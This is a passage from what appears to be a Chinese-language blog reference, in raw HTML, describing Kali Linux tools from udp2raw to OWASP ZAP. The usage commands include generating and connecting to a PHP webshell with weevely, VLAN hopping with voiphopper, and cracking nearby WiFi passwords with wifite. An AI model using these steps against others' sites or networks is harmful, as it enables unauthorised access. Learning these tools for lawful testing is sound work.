class="hljs-comment"># Runat client side</span><br>./udp2raw_amd64-c -l0.0.0.0:3333  -r44.55.66.77:4096 -a-k <span class="hljs-string">&quot;passwd&quot;</span> --raw-mode faketcp<br></code></pre></td></tr></table></figure><h4 id="服务器端输出"><a href="#服务器端输出" class="headerlink" title="服务器端输出"></a>服务器端输出</h4><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162124320.jpeg" alt="b.png"></p><h4 id="客户端输出"><a href="#客户端输出" class="headerlink" title="客户端输出"></a>客户端输出</h4><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162124876.jpeg" alt="c.png"></p><p>此时，已成功通过TCP端口4096在客户端和服务器端之间建立了一条经过加密的通信隧道。在客户端通过UDP端口3333连接，等同于在服务器端连接端口7777。</p><h2 id="unix-privesc-check"><a href="#unix-privesc-check" class="headerlink" title="unix-privesc-check"></a>unix-privesc-check</h2><h3 id="描述：-98"><a href="#描述：-98" class="headerlink" title="描述："></a>描述：</h3><p>unix-privesc-check是<a href="https://so.csdn.net/so/search?q=Kali&spm=1001.2101.3001.7020">Kali</a> Linux自带的一款提权漏洞检测工具。它是一个Shell文件，可以检测所在系统的错误配置，以发现可以用于提权的漏洞。该工具适用于安全审计、渗透测试和系统维护等场景。它可以检测与权限相关的各类文件的读写权限，如认证相关文件、重要配置文件、交换区文件、cron job文件、设备文件、其他用户的家目录、正在执行的文件等等。如果发现可以利用的漏洞，就会给出提示warning。<br>unix-privesc-check并不会检测所有提权漏洞的潜在情况。它只是快速进行检测，并以简洁的方式给出提权漏洞相关的建议，大大减少用户在文件权限检测方面的枯燥工作的量。</p><p>将unix-privesc-check上传到目标主机上，或者直接在本机上。</p><h3 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h3><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unix-privesc-check standard</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162134296.png" alt="image-20220416213458078"></p><p>可以看到一个 rtkit-demon</p><h1 id="V"><a href="#V" class="headerlink" title="V"></a>V</h1><h2 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h2><h3 id="描述：-99"><a href="#描述：-99" class="headerlink" title="描述："></a>描述：</h3><p>vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。vulnhub也是OSCP证书刷题必备的靶场，所以其中实验攻击机用kali均可完成，毕竟是kali认证的证书嘛，其实做一套靶场的过程中就像在考OSCP一样。</p><h3 id="参数：-80"><a href="#参数：-80" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162146938.png" alt="image-20220416214657750"></p><p><a href="https://zhuanlan.zhihu.com/p/340599830">https://zhuanlan.zhihu.com/p/340599830</a></p><h2 id="voiphopper"><a href="#voiphopper" class="headerlink" title="voiphopper"></a>voiphopper</h2><h3 id="描述：-100"><a href="#描述：-100" class="headerlink" title="描述："></a>描述：</h3><p>“VoIP Hopper 是一种安全验证工具,用于测试 PC 是否可以模仿 IP 电话的行为。 它可以快速自动将 VLAN 跳到语音 VLAN。”</p><h3 id="参数：-81"><a href="#参数：-81" class="headerlink" title="参数："></a>参数：</h3><p>其它选项：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l（列出用于CDP嗅探的可用接口，然后退出）</span><br>示例：voiphopper -l<br><span class="hljs-deletion">-m（欺骗MAC地址，然后退出）</span><br>例如：voiphopper -i eth0 -m 00：07：0E：EA：50：86<br><span class="hljs-deletion">-d（删除VLAN接口，然后退出）</span><br>示例：voiphopper -d eth0.200<br><span class="hljs-deletion">-V（打印VoIP Hopper版本，然后退出）</span><br>示例：voiphopper -V<br></code></pre></td></tr></table></figure><p>MAC地址欺骗选项（与-a，-v或-c选项一起使用）：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">-</span><span class="hljs-variable">m</span>（欺骗现有接口和新接口的<span class="hljs-variable">MAC</span>地址）<br><span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-operator">-</span><span class="hljs-variable">m</span>（仅欺骗新的语音接口的<span class="hljs-variable">MAC</span>地址）<br>例如：<span class="hljs-variable">voiphopper</span> <span class="hljs-operator">-</span><span class="hljs-variable">i</span> <span class="hljs-variable">eth0</span> <span class="hljs-operator">-</span><span class="hljs-variable">m</span> <span class="hljs-number">00</span>：<span class="hljs-number">07</span>：<span class="hljs-number">0</span><span class="hljs-built_in">E</span>：<span class="hljs-variable">EA</span>：<span class="hljs-number">50</span>：<span class="hljs-number">86</span><br>例如：<span class="hljs-variable">voiphopper</span> <span class="hljs-operator">-</span><span class="hljs-variable">i</span> <span class="hljs-variable">eth0</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-operator">-</span><span class="hljs-variable">m</span> <span class="hljs-number">00</span>：<span class="hljs-number">07</span>：<span class="hljs-number">0</span><span class="hljs-built_in">E</span>：<span class="hljs-variable">EA</span>：<span class="hljs-number">50</span>：<span class="hljs-number">86</span><br></code></pre></td></tr></table></figure><p>CDP嗅探模式(- c0)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">例如:voiphopper -i eth0 - c0<br></code></pre></td></tr></table></figure><p>CDP欺骗模式（-c 1）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">-E <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（设备ID）<br>-P <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（端口ID）<br>-C <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（功能）<br>-L <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（平台）<br>-S <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（软件）<br>-U <span class="hljs-tag">&lt;<span class="hljs-name">字符串</span>&gt;</span>（双工）<br></code></pre></td></tr></table></figure><p>SIP固件电话的示例用法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">voiphopper -i eth0 -c <span class="hljs-number">1</span> -<span class="hljs-string">E&#x27;SIP00070EEA5086&#x27;</span>-P<span class="hljs-string">&#x27;端口1&#x27;</span>-C主机-L<span class="hljs-string">&#x27;Cisco IP电话7940&#x27;</span>-S<span class="hljs-string">&#x27;P003-08-8-00&#x27;</span>-U <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>SCCP固件电话的示例用法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">voiphopper -i eth0 -c <span class="hljs-number">1</span> -<span class="hljs-string">E&#x27;SEP0070EEA5086&#x27;</span>-P<span class="hljs-string">&#x27;端口1&#x27;</span>-C主机-L<span class="hljs-string">&#x27;Cisco IP电话7940&#x27;</span>-S<span class="hljs-string">&#x27;P00308000700&#x27;</span>-U <br></code></pre></td></tr></table></figure><p>具有MAC欺骗功能的电话的示例用法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">voiphopper -i eth0 -m <span class="hljs-number">00</span>：<span class="hljs-number">07</span>：<span class="hljs-number">0</span>E：EA：<span class="hljs-number">50</span>：<span class="hljs-number">86</span> -c <span class="hljs-number">1</span> -<span class="hljs-string">E&#x27;SEP00070EEA5086&#x27;</span>-P<span class="hljs-string">&#x27;端口1&#x27;</span>-C主机-L<span class="hljs-string">&#x27;Cisco IP电话7940&#x27;</span>-S<span class="hljs-string">&#x27;P003-08-8 -00&#x27;</span>-U <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Avaya DHCP选项模式（-a）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">示例：voiphopper -<span class="hljs-selector-tag">i</span> eth0 -<span class="hljs-selector-tag">a</span><br>例如：voiphopper -<span class="hljs-selector-tag">i</span> eth0 -<span class="hljs-selector-tag">a</span> -m <span class="hljs-number">00</span>：<span class="hljs-number">07</span>：<span class="hljs-number">0</span>E：EA：<span class="hljs-number">50</span>：<span class="hljs-number">86</span><br></code></pre></td></tr></table></figure><p>VLAN Hop模式(-v VLAN ID):</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">例如<span class="hljs-symbol">:voiphopper</span> -i eth0 - v200<br>例子<span class="hljs-symbol">:voiphopper</span> -i eth0 -v <span class="hljs-number">200</span> -D -m <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">E:</span><span class="hljs-symbol">EA:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">86</span><br></code></pre></td></tr></table></figure><p>阿尔卡特VLAN发现(- t0 |1|2):</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">例如<span class="hljs-symbol">:voiphopper</span> -i eth0 - t0<br>例如<span class="hljs-symbol">:voiphopper</span> -i eth0 - t1<br>例如<span class="hljs-symbol">:voiphopper</span> -i eth0 -t <span class="hljs-number">0</span> -m <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">ad:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><br>例如<span class="hljs-symbol">:voiphopper</span> -i eth0 -t <span class="hljs-number">1</span> -m <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">ad:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><br>例如<span class="hljs-symbol">:voiphopper</span> -i eth0 - t2 - v800<br>例如<span class="hljs-symbol">:voiphopper</span> -i eth0 -t <span class="hljs-number">2</span> -v <span class="hljs-number">800</span> -m <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">ad:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><h1 id="W"><a href="#W" class="headerlink" title="W"></a>W</h1><h2 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h2><h3 id="描述：-101"><a href="#描述：-101" class="headerlink" title="描述："></a>描述：</h3><p>WAFW00F是一个Web应用防火墙（WAF）指纹识别的工具。</p><h3 id="参数：-82"><a href="#参数：-82" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://blog.csdn.net/weixin_43047908/article/details/118148256">https://blog.csdn.net/weixin_43047908/article/details/118148256</a></p><h2 id="wapiti"><a href="#wapiti" class="headerlink" title="wapiti"></a>wapiti</h2><h3 id="描述：-102"><a href="#描述：-102" class="headerlink" title="描述："></a>描述：</h3><p>wapiti是一款对萌新非常友好的一个扫描工具，工具导出的报告里面的漏洞利用，直接复制粘贴就可以使用，缺点个人认为扫描的速度有点慢，我扫描了4个靶机最少的时间也要3个小时。但是还是推荐萌新入门使用的。</p><h3 id="参数：-83"><a href="#参数：-83" class="headerlink" title="参数："></a>参数：</h3><p>wapiti -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -o wapiti_result -f html</p><p>-u 为要测试的网站<br>-0 导出报告的文件名<br>-f 为导出报告的格式<br><a href="http://testphp.vulnweb.com/%E4%B8%BA%E9%9D%B6%E6%9C%BA%E6%89%80%E4%BB%A5%E5%A4%A7%E5%AE%B6%E5%8F%AF%E4%BB%A5%E6%94%BE%E5%BF%83%E6%89%AB%E6%8F%8F">http://testphp.vulnweb.com/为靶机所以大家可以放心扫描</a></p><p>下面的图片就是打出的报告啦<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162158785.png" alt="在这里插入图片描述"></p><h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><h3 id="描述：-103"><a href="#描述：-103" class="headerlink" title="描述："></a>描述：</h3><p><strong>weevely是一款基于python编写的webshell生成、管理工具。</strong></p><h3 id="参数：-84"><a href="#参数：-84" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely  generate  &lt;password&gt;  &lt;path&gt;       生成指定路径带密码的php文件      <br><br>weevely  &lt;url&gt;  &lt;password&gt;                          连接php文件<br></code></pre></td></tr></table></figure><h4 id="weevely主页面"><a href="#weevely主页面" class="headerlink" title="weevely主页面"></a>weevely主页面</h4><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162201070.png" alt="img"></p><h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><p><strong>1.生成带密码的php文件</strong></p><p>weevely generate <password> <path></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162201462.png" alt="img"></p><p><strong>2.将PHP文件放在目标网站后，连接php文件</strong></p><p>weevely <url> <password></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162205146.png" alt="img"></p><p><strong>3.连接成功后会得到shell，除了执行基础的系统命令，我们还可以输入help，调用weevely模块。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162205942.png" alt="img"></p><p><strong>4.比如net_scan模块，我们输入”net_scan”,可以查看帮助信息。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162206368.png" alt="img"></p><p><strong>5.然后输入”net_scan <addresses> <ports>“使用该模块。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162212428.png" alt="img"></p><h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><h3 id="描述：-104"><a href="#描述：-104" class="headerlink" title="描述："></a>描述：</h3><p>Wfuzz是一款为了评估WEB应用而生的Fuzz（Fuzz是爆破的一种手段）工具，它基于一个简单的理念，即用给定的Payload去fuzz。它允许在HTTP请求里注入任何输入的值，针对不同的WEB应用组件进行多种复杂的爆破攻击。比如：参数、认证、表单、目录&#x2F;文件、头部等等，这款工具在kali里面自带。</p><h3 id="参数：-85"><a href="#参数：-85" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://blog.csdn.net/JBlock/article/details/88619117">https://blog.csdn.net/JBlock/article/details/88619117</a></p><h2 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h2><h3 id="描述：-105"><a href="#描述：-105" class="headerlink" title="描述："></a>描述：</h3><p>WhatWeb是一个开源的网站指纹识别软件。</p><p>WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计&#x2F;分析包，Javascript库，服务器和嵌入式设备。</p><p>WhatWeb有超过1000个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，账户ID，Web框架模块，SQL错误等。</p><p>。</p><h3 id="参数：-86"><a href="#参数：-86" class="headerlink" title="参数："></a>参数：</h3><h4 id="查看whatweb版本"><a href="#查看whatweb版本" class="headerlink" title="查看whatweb版本"></a>查看whatweb版本</h4><p>whatweb -version</p><h4 id="初步使用"><a href="#初步使用" class="headerlink" title="初步使用"></a>初步使用</h4><p>1.单个目标<br>whatweb 192.168.1.100<br>2.从外部导入目标数据进行批量探测<br>whatweb -input-file&#x3D;路径<br>或者<br>whatweb -i 路径<br>c.根据特定的格式探测的结果导出<br>whatweb 192.168.1.110 -log-xml&#x3D;result.xml</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162327451.png" alt="image-20220416232702271"></p><h4 id="whatweb的高级使用"><a href="#whatweb的高级使用" class="headerlink" title="whatweb的高级使用"></a>whatweb的高级使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">whatweb -v 192.168.1.100<br>详细输出<br><br>whatweb 192.168.1.100/24 -url-suffix=<span class="hljs-string">&quot;:8080&quot;</span><br>-url-prefix //添加前缀<br>-url-suffix // 添加后缀<br>-url-pattern //在中间插入内容<br><br>whatweb -v -proxy-user admin:password url<br>以指定用户名和密码进行探测<br><br>whatweb -v -c=cookie值 url<br>通过-c,指定cookie的值<br><br>whatweb -l<br>使用参数-l可以列出插件的列表,包括插件以及插件的描述<br><br>whatweb -info-plugins=“YouTube”<br>通过以上参数具体查看插件的内容<br></code></pre></td></tr></table></figure><h2 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h2><h3 id="描述：-106"><a href="#描述：-106" class="headerlink" title="描述："></a>描述：</h3><p> wifite是一款自动化wep、wpa破解工具，不支持windows和osx。wifite的特点是可以同时攻击多个采用wep和wpa加密的网络。wifite只需简单的配置即可自动化运行，期间无需人工干预。 目前支持任何linux发行版、Backtrack 5 R1, BlackBuntu, BackBox等。</p><h3 id="参数：-87"><a href="#参数：-87" class="headerlink" title="参数："></a>参数：</h3><p>Wifite使用命令行界面连续攻击多个WPA、WPS加密的网络，不需要记住参数即可使用它：</p><p>按信号强度排序（db单位）<br>详细显示是否用WPS加密，并显示Client连接数<br>可自定义设置（超时，数据包 &#x2F; 秒）<br>“匿名攻击”（攻击之前自动更改随机MAC地址）<br>退出时显示会话摘要，显示任何所破解的秘钥</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162331044.png" alt="在这里插入图片描述"></p><h3 id="实例-6"><a href="#实例-6" class="headerlink" title="实例:"></a>实例:</h3><h4 id="wifite硬核破解WiFi密码"><a href="#wifite硬核破解WiFi密码" class="headerlink" title="wifite硬核破解WiFi密码 "></a><a href="https://www.cnblogs.com/nanstar/p/12319158.html">wifite硬核破解WiFi密码 </a></h4><h4 id="如题-楼主在这里分享下如何使用工具破解附近的WiFi-今天使用的工具是-wifite"><a href="#如题-楼主在这里分享下如何使用工具破解附近的WiFi-今天使用的工具是-wifite" class="headerlink" title="如题 楼主在这里分享下如何使用工具破解附近的WiFi 今天使用的工具是 wifite"></a>如题 楼主在这里分享下如何使用工具破解附近的WiFi 今天使用的工具是 <code>wifite</code></h4><h6 id="现在都有WiFi万能钥匙了-暴力破解还有市场吗？"><a href="#现在都有WiFi万能钥匙了-暴力破解还有市场吗？" class="headerlink" title="现在都有WiFi万能钥匙了 暴力破解还有市场吗？"></a>现在都有WiFi万能钥匙了 暴力破解还有市场吗？</h6><h6 id="首先他俩的破解思路就不一样-wifi万能钥匙是根据云端数据库内容匹配密码-而今天我说的这个是利用密码尝试来破解WiFi-比起万能钥匙-这个方法更加的可靠点"><a href="#首先他俩的破解思路就不一样-wifi万能钥匙是根据云端数据库内容匹配密码-而今天我说的这个是利用密码尝试来破解WiFi-比起万能钥匙-这个方法更加的可靠点" class="headerlink" title="首先他俩的破解思路就不一样 wifi万能钥匙是根据云端数据库内容匹配密码 而今天我说的这个是利用密码尝试来破解WiFi 比起万能钥匙 这个方法更加的可靠点"></a>首先他俩的破解思路就不一样 wifi万能钥匙是根据云端数据库内容匹配密码 而今天我说的这个是利用密码尝试来破解WiFi 比起万能钥匙 这个方法更加的可靠点</h6><blockquote><p>测试环境：</p><blockquote><p>kalilinux系统、wifite软件、外置网卡、wifi密码包<br>wifite 能够自动抓取WiFi握手包，并进行破解，相比手动更加的快捷，更加实用。</p></blockquote></blockquote><h4 id="1、插上网卡，输入wifite，系统会自动启动软件，并开始扫描附近的WiFi信息"><a href="#1、插上网卡，输入wifite，系统会自动启动软件，并开始扫描附近的WiFi信息" class="headerlink" title="1、插上网卡，输入wifite，系统会自动启动软件，并开始扫描附近的WiFi信息"></a>1、插上网卡，输入wifite，系统会自动启动软件，并开始扫描附近的WiFi信息</h4><blockquote><p>注意：</p><blockquote><p>若是命令输入之后还没有开始扫描，应该是网卡的监听模式没有开启，这时候，关闭这个程序，新开窗口输入<br>airmon-ng star wlan0 (打开wlan0网卡监听模式)然后再次打开wifite软件</p></blockquote></blockquote><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162331171.png" alt="img"></p><h4 id="2、等待WiFi信息加载，这时候可以看到我们已经搜索到六个WiFi信号。"><a href="#2、等待WiFi信息加载，这时候可以看到我们已经搜索到六个WiFi信号。" class="headerlink" title="2、等待WiFi信息加载，这时候可以看到我们已经搜索到六个WiFi信号。"></a>2、等待WiFi信息加载，这时候可以看到我们已经搜索到六个WiFi信号。</h4><blockquote><table><thead><tr><th>NUM</th><th>Essid</th><th>CH</th><th>ENCR</th><th>POWER</th><th>WPS?</th><th>CLIENT</th></tr></thead><tbody><tr><td>WiFi序号</td><td>WiFi名称</td><td>信道</td><td>加密方式</td><td>信号强度</td><td>是否支持wps</td><td>当前连接用户（已连接WiFi的用户）</td></tr></tbody></table><blockquote><p>若是支持wps破解的时候破解时间可能会减少，破解WiFi的时候必须是要有用户连接这个WiFi的，否则无法抓到握手包</p></blockquote></blockquote><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162331246.png" alt="img"></p><h4 id="3、然后我们看好了想破解的WiFi，按下组合键（Ctrl-c）然后输入WiFi名称前的序号，等待程序自动破解。"><a href="#3、然后我们看好了想破解的WiFi，按下组合键（Ctrl-c）然后输入WiFi名称前的序号，等待程序自动破解。" class="headerlink" title="3、然后我们看好了想破解的WiFi，按下组合键（Ctrl+c）然后输入WiFi名称前的序号，等待程序自动破解。"></a>3、然后我们看好了想破解的WiFi，按下组合键（Ctrl+c）然后输入WiFi名称前的序号，等待程序自动破解。</h4><blockquote><p>过程显示了破解WiFi的名称，破解进度，完成之后会显示破解WiFi的密码信息。</p></blockquote><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162331314.png" alt="img"></p><h4 id="4、wifite默认是有密码包的，不过所使用的密码包太小了，我们可以自定义密码包，密码包的路径是-usr-share-dict-wordlist-probable-txt-我们可以根据自己的需要来替换这个密码包。"><a href="#4、wifite默认是有密码包的，不过所使用的密码包太小了，我们可以自定义密码包，密码包的路径是-usr-share-dict-wordlist-probable-txt-我们可以根据自己的需要来替换这个密码包。" class="headerlink" title="4、wifite默认是有密码包的，不过所使用的密码包太小了，我们可以自定义密码包，密码包的路径是 /usr/share/dict/wordlist-probable.txt,我们可以根据自己的需要来替换这个密码包。"></a>4、wifite默认是有密码包的，不过所使用的密码包太小了，我们可以自定义密码包，密码包的路径是 <code>/usr/share/dict/wordlist-probable.txt</code>,我们可以根据自己的需要来替换这个密码包。</h4><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="https-blog-csdn-net-qq-43543789-article-details-106394870-text-E5-8D-95-E5-87-BBWindows-20Installer-64-E6-8C-89-E9-92-AE-EF-BC-8C-E5-8D-B3-E5-8F-AF-E5-AE-89-E8-A3-85-E6-88-90-E5-8A-9F-E3-80-82"><a href="#https-blog-csdn-net-qq-43543789-article-details-106394870-text-E5-8D-95-E5-87-BBWindows-20Installer-64-E6-8C-89-E9-92-AE-EF-BC-8C-E5-8D-B3-E5-8F-AF-E5-AE-89-E8-A3-85-E6-88-90-E5-8A-9F-E3-80-82" class="headerlink" title="https://blog.csdn.net/qq_43543789/article/details/106394870#:~:text=%E5%8D%95%E5%87%BBWindows%20Installer(64,%E6%8C%89%E9%92%AE%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E3%80%82"></a><a href="https://blog.csdn.net/qq_43543789/article/details/106394870#:~:text=%E5%8D%95%E5%87%BBWindows%20Installer">https://blog.csdn.net/qq_43543789/article/details/106394870#:~:text=%E5%8D%95%E5%87%BBWindows%20Installer</a>(64,%E6%8C%89%E9%92%AE%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E3%80%82</h3><h2 id="wordlists"><a href="#wordlists" class="headerlink" title="wordlists"></a>wordlists</h2><h3 id="描述：-107"><a href="#描述：-107" class="headerlink" title="描述："></a>描述：</h3><p><a href="https://blog.csdn.net/Jiajiajiang_/article/details/88638367">https://blog.csdn.net/Jiajiajiang_/article/details/88638367</a></p><h3 id="参数：-88"><a href="#参数：-88" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://blog.csdn.net/lijiajin1228/article/details/103971101">https://blog.csdn.net/lijiajin1228/article/details/103971101</a></p><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><h3 id="描述：-108"><a href="#描述：-108" class="headerlink" title="描述："></a>描述：</h3><p>WPScan是专门检查<strong>WordPress</strong>网站漏洞的工具，它可以全面检查wp网站的漏洞，例如插件，主题，备份文件等，有助于我们增加网站安全防护。类似我这种个人建个站，也可以通过WPScan来检查自己网站的漏洞，但是切记不要对别人的网站发起攻击。</p><p>wpscan是属于收费的，默认没有apikey的话，只能进行较为模糊的扫描。不过可以通过官网注册个账号，每天有25次免费调用的次数。</p><h3 id="参数：-89"><a href="#参数：-89" class="headerlink" title="参数："></a>参数：</h3><p>参数说明<br>-h帮助文档</p><ul><li>-url扫描站点</li><li>-update更新版本<br>-e vp扫描插件漏洞<br>-e ap扫描所有插件<br>-e p扫描流行的插件<br>-e vt扫描主题漏洞<br>-e at扫描所有主题<br>-e t更新流行的主题<br>-U爆破指定的密码列表<br>-P爆破指定的用户名列表</li><li>-api-token token值扫描主题、插件漏洞时，需要用到</li></ul><table>   <tr>      <td></td>   </tr>   <tr>      <td>参数</td>      <td>说明</td>   </tr>   <tr>      <td>-h</td>      <td>帮助文档</td>   </tr>   <tr>      <td>- -url</td>      <td>扫描站点</td>   </tr>   <tr>      <td>- -update</td>      <td>更新版本</td>   </tr>   <tr>      <td>-e vp</td>      <td>扫描插件漏洞</td>   </tr>   <tr>      <td>-e ap</td>      <td>扫描所有插件</td>   </tr>   <tr>      <td>-e p</td>      <td>扫描流行的插件</td>   </tr>   <tr>      <td>-e vt</td>      <td>扫描主题漏洞</td>   </tr>   <tr>      <td>-e at</td>      <td>扫描所有主题</td>   </tr>   <tr>      <td>-e t</td>      <td>更新流行的主题</td>   </tr>   <tr>      <td>-U</td>      <td>爆破指定的密码列表</td>   </tr>   <tr>      <td>-P</td>      <td>爆破指定的用户名列表</td>   </tr>   <tr>      <td>- -api-token token值</td>      <td>扫描主题、插件漏洞时，需要用到</td>   </tr></table><p>实例:</p><p><a href="https://blog.csdn.net/guo15890025019/article/details/118548932">https://blog.csdn.net/guo15890025019/article/details/118548932</a></p><h1 id="X"><a href="#X" class="headerlink" title="X"></a>X</h1><p>noene</p><h1 id="Y"><a href="#Y" class="headerlink" title="Y"></a>Y</h1><p>none</p><h1 id="Z"><a href="#Z" class="headerlink" title="Z"></a>Z</h1><h2 id="zap"><a href="#zap" class="headerlink" title="zap"></a>zap</h2><h3 id="描述：-109"><a href="#描述：-109" class="headerlink" title="描述："></a>描述：</h3><p>OWASP ZAP是一款非常好用的测试工具，也是Kali里自带的工具，一键就可以扫描多种不同类型的漏洞，最好用的一点就是他可以自动爬取子域名。非常的快捷方便下面我就给大家带来OWASP ZAP的基本使用方法Let’s go。</p><p>设置网络代理<br>使用ZAP之前我们要先设置一下网络代理，我们打开浏览器(本人用的是Kali自带的火狐浏览器)，选择Preferences</p><h3 id="参数：-90"><a href="#参数：-90" class="headerlink" title="参数："></a>参数：</h3><p>设置网络代理<br>使用ZAP之前我们要先设置一下网络代理，我们打开浏览器(本人用的是Kali自带的火狐浏览器)，选择Preferences</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171401385.png" alt="OWASP 